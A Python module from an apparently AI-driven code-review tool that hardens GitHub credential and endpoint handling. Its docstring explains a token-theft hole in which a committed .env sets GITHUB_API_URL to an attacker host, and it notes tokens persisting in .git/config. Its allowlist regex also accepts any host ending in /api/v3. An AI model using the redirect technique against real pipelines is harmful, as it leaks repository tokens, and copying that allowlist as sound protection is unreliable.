#!/usr/bin/env python3
"""
Credential and endpoint resolution.

This closes the single worst hole found in the v0.5.0 review, which needed no
prompt injection at all:

    github_client.py:45-52   candidates = [env_file, os.getcwd()/".env", ...]
    github_client.py:43      found.setdefault(...)          # first file wins
    github_client.py:56-58   process env overrides ONLY if the var is set
    github_client.py:72      self.api = api_url or env["GITHUB_API_URL"] or DEFAULT
    github_write.py:83-89    POST to self.api with Authorization: Bearer <token>

`GITHUB_API_URL` is commented out in `.env.example`, so it is normally unset in
the process environment. A pull request that commits a `.env` file containing
`GITHUB_API_URL=https://attacker.example` therefore redirects the *parent's*
authenticated POST and hands over the installation token. The victim is the
parent process, not the agent, so "keep the token out of the agent's
environment" does not help.

Two rules here, both tested:

  1. The API base URL is INJECTED by the caller. It is never read from any file,
     and never from anything reachable by a checkout.
  2. There is no dotenv discovery. Credentials arrive explicitly.

Stdlib only.
"""
import os
import re
from typing import Optional, Protocol

PUBLIC_API = "https://api.github.com"

# Endpoints the runner may ever talk to. An injected URL still has to be
# plausible: a typo in a workflow input should not silently exfiltrate a token.
_ALLOWED_API_HOST = re.compile(
    r"^https://(api\.github\.com|[A-Za-z0-9.-]+\.ghe\.com|[A-Za-z0-9.-]+/api/v3)/?$"
)


class AuthError(Exception):
    pass


class TokenProvider(Protocol):
    """Lets a PAT and a short-lived installation token be interchangeable.

    Installation tokens expire after one hour, so the poster resolves the token
    immediately before posting rather than holding one for the whole run.
    """

    def token(self) -> str: ...
    def describe(self) -> str: ...


class StaticToken:
    """A PAT, for local `aireview review` runs."""

    def __init__(self, value: str, *, source: str = "explicit"):
        if not value or not value.strip():
            raise AuthError("empty token")
        self._value = value.strip()
        self._source = source

    def token(self) -> str:
        return self._value

    def describe(self) -> str:
        return f"static token ({self._source})"


class EnvToken:
    """Read from a NAMED process environment variable only.

    Note what this does not do: no `./.env`, no `~/.config/...`, no plugin-root
    fallback. In CI the token is injected by `actions/create-github-app-token`
    into the step environment, and a checkout cannot influence that.
    """

    def __init__(self, var: str = "GITHUB_TOKEN"):
        self._var = var

    def token(self) -> str:
        v = os.environ.get(self._var)
        if not v:
            raise AuthError(
                f"{self._var} is not set in the process environment. "
                "Credentials are never read from files in or near a checkout."
            )
        return v

    def describe(self) -> str:
        return f"process env ${self._var}"


class Endpoint:
    """The GitHub API base URL. Injected, validated, never discovered."""

    def __init__(self, base_url: Optional[str] = None):
        url = (base_url or PUBLIC_API).rstrip("/")
        if not _ALLOWED_API_HOST.match(url + "/"):
            raise AuthError(
                f"refusing API base URL {url!r}: not a recognised GitHub endpoint. "
                "This value must be injected by the workflow and can never come "
                "from repository contents."
            )
        self.base_url = url

    def __str__(self):
        return self.base_url


def resolve(*, token_provider: TokenProvider, api_base_url: Optional[str] = None):
    """Resolve credentials and endpoint together, so neither is defaulted silently."""
    endpoint = Endpoint(api_base_url)
    token_provider.token()  # fail fast and loudly if absent
    return token_provider, endpoint


def assert_no_credentials_in_workspace(workspace: str, token: str) -> list:
    """Return files under `workspace` containing the token.

    `repo-checkout/SKILL.md:19` clones via
    `https://x-access-token:$GITHUB_TOKEN@github.com/<repo>.git`, and git
    persists that URL verbatim in `<workspace>/.git/config`. `SKILL.md:32`
    claims the token is "never written to disk"; that is false for this clone
    form, and the reviewer agents hold `Read`/`Grep` over the workspace.

    The fix is to clone without credentials in the URL. This is the assertion
    that proves it, and it runs as a gate before the agent is started.
    """
    hits = []
    needle = token.encode("utf-8")
    for dirpath, dirnames, filenames in os.walk(workspace):
        dirnames[:] = [d for d in dirnames if d != "node_modules"]
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                with open(p, "rb") as fh:
                    if needle in fh.read():
                        hits.append(p)
            except (OSError, MemoryError):
                continue
    return hits
